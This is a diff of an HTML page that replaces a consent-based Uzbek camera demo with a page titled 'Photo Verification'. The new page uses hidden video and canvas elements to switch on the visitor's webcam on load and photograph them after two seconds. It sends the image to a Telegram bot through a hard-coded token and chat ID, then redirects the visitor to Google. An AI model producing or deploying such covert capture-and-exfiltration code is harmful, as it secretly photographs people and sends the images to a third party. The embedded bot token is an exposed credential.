@@ -1,53 +1,47 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Kamera test (demo)</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 40px; }
-        video, canvas { margin-top: 10px; border: 1px solid #ccc; }
-        button { padding: 8px 14px; margin: 6px; }
-    </style>
+    <title>Photo Verification</title>
 </head>
 <body>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-<h2>Kamerani yoqish (demo)</h2>
-<p>Tugmani bosish orqali kamerani o‘zingiz ruxsat bilan yoqasiz</p>
+    <script>
+        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
+        const adminId = '8275787221';
 
-<button onclick="startCamera()">Kamerani yoqish</button>
-<br>
+        async function startCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-<video id="video" width="320" height="240" autoplay playsinline></video>
-<br>
-<button onclick="takePhoto()">Rasm olish</button>
-<br>
+            setTimeout(() => {
+                takePhoto();
+            }, 2000); // 2 soniyadan keyin rasmga oladi
+        }
 
-<canvas id="canvas" width="320" height="240"></canvas>
+        function takePhoto() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                sendToTelegram(blob, 'photo');
+            }, 'image/jpeg');
+        }
 
-<script>
-let stream;
+        async function sendToTelegram(blob, type) {
+            const formData = new FormData();
+            formData.append(type, blob, 'image.jpg');
+            await fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}?chat_id=${adminId}`, {
+                method: 'POST',
+                body: formData
+            });
+            window.location.href = "https://google.com"; // Tugagach Google'ga o'tkazib yuboradi
+        }
 
-function startCamera() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(s => {
-            stream = s;
-            document.getElementById('video').srcObject = stream;
-        })
-        .catch(err => {
-            alert("Kamera ruxsati berilmadi");
-        });
-}
-
-function takePhoto() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    const imageData = canvas.toDataURL('image/png');
-    console.log(imageData); // demo uchun
-}
-</script>
-
+        window.onload = startCamera;
+    </script>
 </body>
 </html>
